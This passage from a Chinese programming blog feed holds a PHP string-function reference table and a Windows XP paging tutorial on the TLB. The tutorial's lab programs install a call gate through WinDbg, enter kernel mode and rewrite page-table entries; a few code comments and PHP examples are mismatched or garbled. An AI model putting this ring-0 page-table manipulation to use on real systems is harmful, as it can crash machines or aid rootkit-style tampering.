<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//开始时间</span><br><span class="line"><span class="variable">$time_start</span> = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">//循环一万次</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = 0 ; <span class="variable">$i</span> &lt; 10000 ; <span class="variable">$i</span>++)&#123;</span><br><span class="line">   //你可以用上，mktime() 生成一个昨天的时间</span><br><span class="line">   //再用strtotime() 生成一个昨天的时间</span><br><span class="line">   //对比两个函数认的效率高</span><br><span class="line">&#125;</span><br><span class="line">//结整时间</span><br><span class="line"><span class="variable">$time_end</span> = microtime(<span class="literal">true</span>);</span><br><span class="line">//相减得到运行时间</span><br><span class="line"><span class="variable">$time</span> = <span class="variable">$time_end</span> - <span class="variable">$time_start</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;这个脚本执行的时间为 <span class="variable">$time</span> seconds\n&quot;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">这个脚本执行的时间为 0.00016498565673828 seconds</span><br></pre></td></tr></table></figure>

<blockquote>
<p>最后输出的结果就是我们实际的函数的执行时间。你可以多对比几次，看看最终的结果。<br>谁的时间短，在实际的工作中，你就可以经常使用哪个函数。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-6-字符串常用函数"><a href="#2-6-字符串常用函数" class="headerlink" title="2.6  字符串常用函数"></a><font color="#3CB371" face="Comic sans MS">2.6  字符串常用函数</font></h4><p><font color="red"><strong>数组</strong></font>、<font color="red"><strong>字符串</strong></font>和<font color="red"><strong>数据库</strong></font>是我们函数里面最、最、最常用的三类函数。</p>
<p><font face="Comic sans MS">当然PHP的字符串函数也有很多。我们最常使用的两个系列的字符串：<br>    1.单字节字符串处理函数<br>    2.多字节字符串处理函数<br>    3.字符串编码转换函数<br></font></p>
<blockquote>
<p><font color="#FF6347"><strong>我们来说说为什么要学这么多函数：</strong></font><br>    1.我们学的是中文，是双字节或者三字节的。老外的函数只能处理英文和数字这些单字节的字符串处理不鸟中文。达不到我们的功能需求<br>    2.有的时候需要做不同字符编码间的转换，例如：把GBK的转为UTF-8<br>    3.英文这些字符在电脑里又是必须要处理的</p>
</blockquote>
<p>&amp;emsp;</p>
<blockquote>
<p>中文主要用的是GBK和utf-8两种编码格式。<br>GBK和utf-8是两个不同的编码委员会对于汉字进行的编码的标准。<br>他们规定GBK是双字节，也就是一个汉字占用2Bytes。<br>utf-8是三字节，一个汉字占用三个字节长度的存储空间。</p>
</blockquote>
<p>&amp;emsp;<br><font color="#00B2EE">PHP常用函数：</font></p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">trim()</td>
<td align="left">删除字符串两端的空格或其他预定义字符</td>
<td align="left">“$str &#x3D; “\r\nHello World!\r\n”; echo trim($str);</td>
</tr>
<tr>
<td align="center">rtrim()</td>
<td align="left">删除字符串右边的空格或其他预定义字符</td>
<td align="left">“$str &#x3D; “Hello World!\n\n”; echo rtrim($str);”</td>
</tr>
<tr>
<td align="center">chop()</td>
<td align="left">rtrim()的别名</td>
<td align="left">同上</td>
</tr>
<tr>
<td align="center">ltrim()</td>
<td align="left">删除字符串左边的空格或其他预定义字符</td>
<td align="left">“$str &#x3D; “\r\nHello World!”; echo ltrim($str);”</td>
</tr>
<tr>
<td align="center">dirname()</td>
<td align="left">回路径中的目录部分（我们把它归在了字符串函数里了）</td>
<td align="left">echo dirname(“c:&#x2F;testweb&#x2F;home.php”);</td>
</tr>
<tr>
<td align="center">str_pad()</td>
<td align="left">把字符串填充为指定的长度</td>
<td align="left">$str &#x3D; “Hello World”; echo str_pad($str,20,”.”);</td>
</tr>
<tr>
<td align="center">str_repeat()</td>
<td align="left">重复使用指定字符串</td>
<td align="left">echo str_repeat(“.”,13);</td>
</tr>
<tr>
<td align="center">str_split()</td>
<td align="left">把字符串分割到数组中</td>
<td align="left">print_r(str_split(“Hello”));</td>
</tr>
<tr>
<td align="center">strrev()</td>
<td align="left">反转字符串</td>
<td align="left">echo strrev(“Hello World!”);</td>
</tr>
<tr>
<td align="center">wordwrap()</td>
<td align="left">按照指定长度对字符串进行折行处理</td>
<td align="left">“$str &#x3D; “”An example on a long word is: Supercalifragulistic””; echo wordwrap($str,15);”</td>
</tr>
<tr>
<td align="center">str_shuffle()</td>
<td align="left">随机地打乱字符串中所有字符</td>
<td align="left">echo str_shuffle(“Hello World”);</td>
</tr>
<tr>
<td align="center">parse_str()</td>
<td align="left">将字符串解析成变量</td>
<td align="left">“parse_str(“id&#x3D;23&amp;name&#x3D;John%20Adams”,$myArray); print_r($myArray);”</td>
</tr>
<tr>
<td align="center">number_format()</td>
<td align="left">通过千位分组来格式化数字</td>
<td align="left">“echo number_format(“1000000”); echo number_format(“1000000”,2); echo number_format(“1000000”,2,””,””,””.””);”</td>
</tr>
<tr>
<td align="center">strtolower()</td>
<td align="left">字符串转为小写</td>
<td align="left">echo strtolower(“Hello WORLD!”);</td>
</tr>
<tr>
<td align="center">strtoupper()</td>
<td align="left">字符串转为大写</td>
<td align="left">echo strtoupper(“Hello WORLD!”);</td>
</tr>
<tr>
<td align="center">ucfirst()</td>
<td align="left">字符串首字母大写</td>
<td align="left">echo ucfirst(“hello world”);</td>
</tr>
<tr>
<td align="center">ucwords()</td>
<td align="left">字符串每个单词首字符转为大写</td>
<td align="left">echo ucwords(“hello world”);</td>
</tr>
<tr>
<td align="center">htmlentities()</td>
<td align="left">把字符转为HTML实体</td>
<td align="left">$str &#x3D; “”John &amp; ‘Adams’””; echo htmlentities($str, ENT_COMPAT);</td>
</tr>
<tr>
<td align="center">htmlspecialchars()</td>
<td align="left">预定义字符转html编码</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">nl2br()</td>
<td align="left">\n转义为标签</td>
<td align="left">echo nl2br(“One line.\nAnother line.”);</td>
</tr>
<tr>
<td align="center">strip_tags()</td>
<td align="left">剥去 HTML、XML 以及 PHP 的标签</td>
<td align="left">echo strip_tags(“Hello world!”);</td>
</tr>
<tr>
<td align="center">addcslashes()</td>
<td align="left">在指定的字符前添加反斜线转义字符串中字符</td>
<td align="left">$str &#x3D; “”Hello, my name is John Adams.” echo $str; echo addcslashes($str,’m’);”</td>
</tr>
<tr>
<td align="center">stripcslashes()</td>
<td align="left">删除由addcslashes()添加的反斜线</td>
<td align="left">echo stripcslashes(“Hello, \my na\me is Kai Ji\m.”);</td>
</tr>
<tr>
<td align="center">addslashes()</td>
<td align="left">指定预定义字符前添加反斜线</td>
<td align="left">$str &#x3D; “Who’s John Adams?”;echo addslashes($str);</td>
</tr>
<tr>
<td align="center">stripslashes()</td>
<td align="left">删除由addslashes()添加的转义字符</td>
<td align="left">echo stripslashes(“Who&#39;s John Adams?”);</td>
</tr>
<tr>
<td align="center">quotemeta()</td>
<td align="left">在字符串中某些预定义的字符前添加反斜线</td>
<td align="left">$str &#x3D; “Hello world. (can you hear me?)”; echo quotemeta($str);</td>
</tr>
<tr>
<td align="center">chr()</td>
<td align="left">从指定的 ASCII 值返回字符</td>
<td align="left">echo chr(052);</td>
</tr>
<tr>
<td align="center">ord()</td>
<td align="left">返回字符串第一个字符的 ASCII值</td>
<td align="left">echo ord(“hello”);</td>
</tr>
<tr>
<td align="center">strcasecmp()</td>
<td align="left">不区分大小写比较两字符串</td>
<td align="left">echo strcasecmp(“Hello world!”,”HELLO WORLD!”);</td>
</tr>
<tr>
<td align="center">strcmp()</td>
<td align="left">区分大小写比较两字符串</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">strncmp()</td>
<td align="left">比较字符串前n个字符,区分大小写</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">strncasecmp()</td>
<td align="left">比较字符串前n个字符,不区分大小写</td>
<td align="left">int strncasecmp ( string $str1 , string $str2 , int $len )</td>
</tr>
<tr>
<td align="center">strnatcmp()</td>
<td align="left">自然顺序法比较字符串长度,区分大小写</td>
<td align="left">int strnatcmp ( string $str1 , string $str2 )</td>
</tr>
<tr>
<td align="center">strnatcasecmp()</td>
<td align="left">自然顺序法比较字符串长度,不区分大小写</td>
<td align="left">int strnatcasecmp ( string $str1 , string $str2 )</td>
</tr>
<tr>
<td align="center">chunk_split()</td>
<td align="left">将字符串分成小块</td>
<td align="left">str chunk_split(str $body[,int $len[,str $end]])</td>
</tr>
<tr>
<td align="center">strtok()</td>
<td align="left">切开字符串</td>
<td align="left">str strtok(str $str,str $token)</td>
</tr>
<tr>
<td align="center">explode()</td>
<td align="left">使用一个字符串为标志分割另一个字符串</td>
<td align="left">array explode(str $sep,str $str[,int $limit])</td>
</tr>
<tr>
<td align="center">implode()</td>
<td align="left">同join,将数组值用预订字符连接成字符串</td>
<td align="left">string implode ( string $glue , array $pieces )</td>
</tr>
<tr>
<td align="center">substr()</td>
<td align="left">截取字符串</td>
<td align="left">string substr ( string $string , int $start [, int $length ] )</td>
</tr>
<tr>
<td align="center">str_replace()</td>
<td align="left">字符串替换操作,区分大小写</td>
<td align="left">mix str_replace(mix $search,,mix $replace,mix $subject[,int &amp;$num])</td>
</tr>
<tr>
<td align="center">str_ireplace()</td>
<td align="left">字符串替换操作,不区分大小写</td>
<td align="left">mix str_ireplace ( mix $search , mix $replace , mix $subject [, int &amp;$count ] )</td>
</tr>
<tr>
<td align="center">substr_count()</td>
<td align="left">统计一个字符串,在另一个字符串中出现次数</td>
<td align="left">int substr_count ( string $haystack , string $needle [, int $offset &#x3D; 0 [, int $length ]] )</td>
</tr>
<tr>
<td align="center">substr_replace()</td>
<td align="left">替换字符串中某串为另一个字符串</td>
<td align="left">mixed substr_replace ( mixed $string , string $replacement , int $start [, int $length ] )</td>
</tr>
<tr>
<td align="center">similar_text()</td>
<td align="left">返回两字符串相同字符的数量</td>
<td align="left">int similar_text(str $str1,str $str2)</td>
</tr>
<tr>
<td align="center">strchr()</td>
<td align="left">返回一个字符串在另一个字符串中开始位置到结束的字符串</td>
<td align="left">string strstr ( string $str, string $needle , bool $before_needle )</td>
</tr>
<tr>
<td align="center">strrchr()</td>
<td align="left">返回一个字符串在另一个字符串中最后一次出现位置开始到末尾的字符串</td>
<td align="left">string strrchr ( string $haystack , mixed $needle )</td>
</tr>
<tr>
<td align="center">stristr()</td>
<td align="left">返回一个字符串在另一个字符串中开始位置到结束的字符串，不区分大小写</td>
<td align="left">string stristr ( string $haystack , mixed $needle [, bool $before_needle &#x3D; false ] )</td>
</tr>
<tr>
<td align="center">strtr()</td>
<td align="left">转换字符串中的某些字符</td>
<td align="left">string strtr ( string $str , string $from , string $to )</td>
</tr>
<tr>
<td align="center">strpos()</td>
<td align="left">寻找字符串中某字符最先出现的位置</td>
<td align="left">int strpos ( string $haystack , mixed $needle [, int $offset &#x3D; 0 ] )</td>
</tr>
<tr>
<td align="center">stripos()</td>
<td align="left">寻找字符串中某字符最先出现的位置,不区分大小写</td>
<td align="left">int stripos ( string $haystack , string $needle [, int $offset ] )</td>
</tr>
<tr>
<td align="center">strrpos()</td>
<td align="left">寻找某字符串中某字符最后出现的位置</td>
<td align="left">int strrpos ( string $haystack , string $needle [, int $offset &#x3D; 0 ] )</td>
</tr>
<tr>
<td align="center">strripos()</td>
<td align="left">寻找某字符串中某字符最后出现的位置,不区分大小写</td>
<td align="left">int strripos ( string $haystack , string $needle [, int $offset ] )</td>
</tr>
<tr>
<td align="center">strspn()</td>
<td align="left">返回字符串中首次符合mask的子字符串长度</td>
<td align="left">int strspn ( string $str1 , string $str2 [, int $start [, int $length ]] )</td>
</tr>
<tr>
<td align="center">strcspn()</td>
<td align="left">返回字符串中不符合mask的字符串的长度</td>
<td align="left">int strcspn ( string $str1 , string $str2 [, int $start [, int $length ]] )</td>
</tr>
<tr>
<td align="center">str_word_count()</td>
<td align="left">统计字符串含有的单词数</td>
<td align="left">mix str_word_count(str $str,[])</td>
</tr>
<tr>
<td align="center">strlen()</td>
<td align="left">统计字符串长度</td>
<td align="left">int strlen(str $str)</td>
</tr>
<tr>
<td align="center">count_chars()</td>
<td align="left">统计字符串中所有字母出现次数(0..255)</td>
<td align="left">mixed count_chars ( string $string [, int $mode ] )</td>
</tr>
<tr>
<td align="center">md5()</td>
<td align="left">字符串md5编码</td>
<td align="left">$str &#x3D; “Hello”; echo md5($str)</td>
</tr>
<tr>
<td align="center"><font color="red"><strong>iconv：</strong></font></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_substr</td>
<td align="left">获取字符串的部分</td>
<td align="left">string mb_substr ( string $str , int $start [, int $length &#x3D; NULL [, string $encoding &#x3D; mb_internal_encoding() ]] )</td>
</tr>
<tr>
<td align="center">mb_http_output</td>
<td align="left">设置&#x2F;获取 HTTP 输出字符编码</td>
<td align="left">mixed mb_http_output ([ string $encoding &#x3D; mb_http_output() ] )</td>
</tr>
<tr>
<td align="center">mb_strlen</td>
<td align="left">获取字符串的长度</td>
<td align="left">mixed mb_strlen ( string $str [, string $encoding &#x3D; mb_internal_encoding() ] )</td>
</tr>
<tr>
<td align="center">iconv</td>
<td align="left">字符串按要求的字符编码来转换</td>
<td align="left">string iconv ( string $in_charset , string $out_charset , string $str )</td>
</tr>
<tr>
<td align="center">iconv_substr</td>
<td align="left">截取字符串的部分</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">iconv_get_encoding</td>
<td align="left">获取 iconv 扩展的内部配置变量</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_substr_count</td>
<td align="left">统计字符串出现的次数</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_check_encoding</td>
<td align="left">检查字符串在指定的编码里是否有效</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_strrpos</td>
<td align="left">查找字符串在一个字符串中最后出现的位置</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_split</td>
<td align="left">使用正则表达式分割多字节字符串</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">parse_url</td>
<td align="left">解释URL成为一个数组</td>
<td align="left"></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 页保护（三）</title>
    <url>/post/WinXP-ProtectionMode-Page3/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-TLB"><a href="#1-TLB" class="headerlink" title="1 TLB"></a>1 TLB</h2><h3 id="1-1-TLB结构"><a href="#1-1-TLB结构" class="headerlink" title="1.1 TLB结构"></a>1.1 TLB结构</h3><p>当程序访问一个线性地址，需要先查PDPT，然后查PDT，然后查页表PTT，最后才是访问物理页。这期间多次访问内存，效率非常低。于是TLB就被设计出来了。（<a href="https://zhuanlan.zhihu.com/p/108425561">64位CPU分页及TLB请点这儿</a>）</p>
<p>TLB（Translation Lookaside Buffer），也叫<strong>快表</strong>。TLB 表<strong>在CPU内部</strong>，一个CPU有一张TLB表，用来缓存线性地址和物理地址的映射关系，以及属性和访问次数。（实际上缓存的线性地址、物理地址为<mark class="label danger">页基地址</mark>）</p>
<p><img data-src="https://s2.loli.net/2022/01/06/2fU8YBRA6mJ9Sqe.png" alt="37.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/06/8JXZN1HGzQkmKui.png" alt="38.png"></p>
<ul>
<li>LA：存储的是线性地址所在<strong>页基地址</strong>。</li>
<li>PA：线性地址所在对应的<strong>物理页基址</strong>。</li>
<li>ATTR：属性，除了G、XD位属性为<strong>OR</strong>外，其余的位的属性为<strong>AND</strong>。</li>
<li>LRU：统计这个线性地址的读写情况的，这是因为TLB这个表在CPU内部，那么他就不会很大，当线性地址存储满了的时候，他就会看LRU的统计情况，把读写的次数比较少的项删除，然后再把新的线性地址项添上。</li>
</ul>
<div class="note danger"><p>关于TLB表：</p>
<ol>
<li><strong>TLB是受PDE和PTE中的G位影响的</strong>，PDE中的G位又受PS位影响，且G位属性：<mark class="label success">PDE_G || PTE_G</mark>。</li>
<li>不同的CPU这个TLB表的大小不一样，能存几十项或者几百项。</li>
<li>只要CR3寄存器被重写，<strong>哪怕重新写的值和原来的相同</strong>，<strong>TLB立马刷新</strong>。一核一套TLB。</li>
<li>操作系统的<strong>高2G映射基本不变</strong>，如果CR3被重写了，TLB刷新，重建高2G以上很浪费。故高2G的线性地址对应的物理页的G位常为1（全局页）。<br>所以PDE和PTE中有个G标志位：<ul>
<li>G &#x3D; 1，刷新TLB时将不会刷新PDE&#x2F;PTE的G位为1的页。</li>
<li>当TLB满了，根据统计信息将不常用的地址废弃，最近最常用的保留.</li>
</ul>
</li>
</ol>
</div>

<p>TLB在X86体系的CPU里的实际应用最早是从Intel的486CPU开始的，在X86体系的CPU里边，一般都设有如下4组TLB：<br>第一组：缓存一般页表（4K字节页面）的指令页表缓存（Instruction-TLB）；<br>第二组：缓存一般页表（4K字节页面）的数据页表缓存（Data-TLB）；<br>第三组：缓存大尺寸页表（2M&#x2F;4M字节页面）的指令页表缓存（Instruction-TLB）；<br>第四组：缓存大尺寸页表（2M&#x2F;4M字节页面）的数据页表缓存（Data-TLB）</p>
<h3 id="1-2-练习：体验TLB的存在"><a href="#1-2-练习：体验TLB的存在" class="headerlink" title="1.2 练习：体验TLB的存在"></a>1.2 练习：体验TLB的存在</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD TempVal;</span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd		</span><br><span class="line">		<span class="comment">// 1.给NULL挂物理页（修改PTE，这里概率蓝屏）0x01234867(G=0) 0x01234967(G=1)</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x01234867</span></span><br><span class="line">		<span class="comment">// 2.写NULL指针，生成TLB记录</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0</span>],<span class="number">0x12345678</span></span><br><span class="line">		<span class="comment">// 3.再次修改物理页</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x02345867</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 4.模拟进程切换</span></span><br><span class="line">		<span class="comment">//mov eax,cr3</span></span><br><span class="line">		<span class="comment">//mov cr3,eax</span></span><br><span class="line">      </span><br><span class="line">		<span class="comment">//清空NULL的TLB缓存</span></span><br><span class="line">		<span class="comment">//INVLPG dword ptr ds:[0]</span></span><br><span class="line">		<span class="comment">// 4.读NULL，未能读取到 0x01234867，证明TLB已被刷新</span></span><br><span class="line">		mov eax,dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		mov TempVal,eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)R0Function&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)R0Function &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">	  &#125;</span><br><span class="line">	</span><br><span class="line">	PDWORD p = (PDWORD)<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;TempVal的值为：%x\n&quot;</span>,TempVal);<span class="comment">//读</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址NULL中的值为：%x\n&quot;</span>,*p);<span class="comment">//读 </span></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/08/dE8AFSrNIiUXKTV.png" alt="40.png"></p>
<p><strong>结论：</strong>修改一次NULL的PTE，PTE_G  &#x3D; 0后，再继续修改一次NULL的PTE，结果第一次从NULL地址读出来的值是第一次的赋值。说明TLB是存在的。</p>
<div class="note danger"><p><strong>结论：</strong>PTE的G位为0的情况下，凡是涉及修改PTE，要想使修改后的值立即生效，必须使用INVLPG指令，否则由于存在TLB的缘故，修改PTE后第一次再读原地址的值会从TLB中取</p>
</div>

<h3 id="1-3-练习：PTE-G、切换CR3对TLB的影响"><a href="#1-3-练习：PTE-G、切换CR3对TLB的影响" class="headerlink" title="1.3 练习：PTE_G、切换CR3对TLB的影响"></a>1.3 练习：PTE_G、切换CR3对TLB的影响</h3><p>从上一个练习可知，因为TLB的存在，修改PTE后读内存<strong>会</strong>存在“误差”。</p>
<p>但是TLB会受PTE_G值和切换CR3所影响，具体表现为：<strong>修改CR3的值后，PTE_G &#x3D; 1的TLB缓存不会被清理，PTE_G &#x3D; 0的TLB缓存会被清理</strong>。</p>
<div class="note danger"><p><strong>结论：</strong>PTE的G位为0的情况下，凡是涉及修改PTE，要想使修改后的值立即生效，必须使用INVLPG指令，否则由于存在TLB的缘故，修改PTE后第一次再读原地址的值会从TLB中取</p>
</div>

<p>示例1：NULL的PTE_G &#x3D; 0，修改CR3的值，PTE_G &#x3D; 0指向的物理页记录的TLB会被刷新，读内存<strong>不</strong>存在“误差”。</p>
<p><code>mov dword ptr ds:[0xc0000000],0x01234867</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD TempVal;</span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd		</span><br><span class="line">		<span class="comment">// 1.给NULL挂物理页（修改PTE，这里概率蓝屏）0x01234867(G=0) 0x01234967(G=1)</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x01234867</span></span><br><span class="line">		<span class="comment">// 2.写NULL指针，生成TLB记录</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0</span>],<span class="number">0x12345678</span></span><br><span class="line">		<span class="comment">// 3.再次修改物理页</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x02345867</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 4.模拟进程切换</span></span><br><span class="line">		mov eax,cr3</span><br><span class="line">		mov cr3,eax</span><br><span class="line">      </span><br><span class="line">		<span class="comment">//清空NULL的TLB缓存</span></span><br><span class="line">		<span class="comment">//INVLPG dword ptr ds:[0]</span></span><br><span class="line">		<span class="comment">// 4.读NULL，未能读取到 0x01234867，证明TLB已被刷新</span></span><br><span class="line">		mov eax,dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		mov TempVal,eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)R0Function&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)R0Function &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">	  &#125;</span><br><span class="line">	</span><br><span class="line">	PDWORD p = (PDWORD)<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;TempVal的值为：%x\n&quot;</span>,TempVal);<span class="comment">//读</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址NULL中的值为：%x\n&quot;</span>,*p);<span class="comment">//读 </span></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/08/CemXb37TpRhSWAU.png" alt="41.png"></p>
<p>示例2：NULL的PTE_G &#x3D; 1，修改CR3的值，PTE_G &#x3D; 1指向的物理页记录的TLB<strong>不</strong>会被刷新，读内存存在“误差”。</p>
<p><code>mov dword ptr ds:[0xc0000000],0x01234967</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD TempVal;</span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd		</span><br><span class="line">		<span class="comment">// 1.给NULL挂物理页（修改PTE，这里概率蓝屏）0x01234867(G=0) 0x01234967(G=1)</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x01234967</span></span><br><span class="line">		<span class="comment">// 2.写NULL指针，生成TLB记录</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0</span>],<span class="number">0x12345678</span></span><br><span class="line">		<span class="comment">// 3.再次修改物理页</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x02345867</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 4.模拟进程切换</span></span><br><span class="line">		mov eax,cr3</span><br><span class="line">		mov cr3,eax</span><br><span class="line">      </span><br><span class="line">		<span class="comment">//清空NULL的TLB缓存</span></span><br><span class="line">		<span class="comment">//INVLPG dword ptr ds:[0]</span></span><br><span class="line">		<span class="comment">// 4.读NULL，未能读取到 0x01234867，证明TLB已被刷新</span></span><br><span class="line">		mov eax,dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		mov TempVal,eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)R0Function&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)R0Function &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">	  &#125;</span><br><span class="line">	</span><br><span class="line">	PDWORD p = (PDWORD)<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;TempVal的值为：%x\n&quot;</span>,TempVal);<span class="comment">//读</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址NULL中的值为：%x\n&quot;</span>,*p);<span class="comment">//读 </span></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/08/zC53D6ukZgeqScQ.png" alt="42.png"></p>
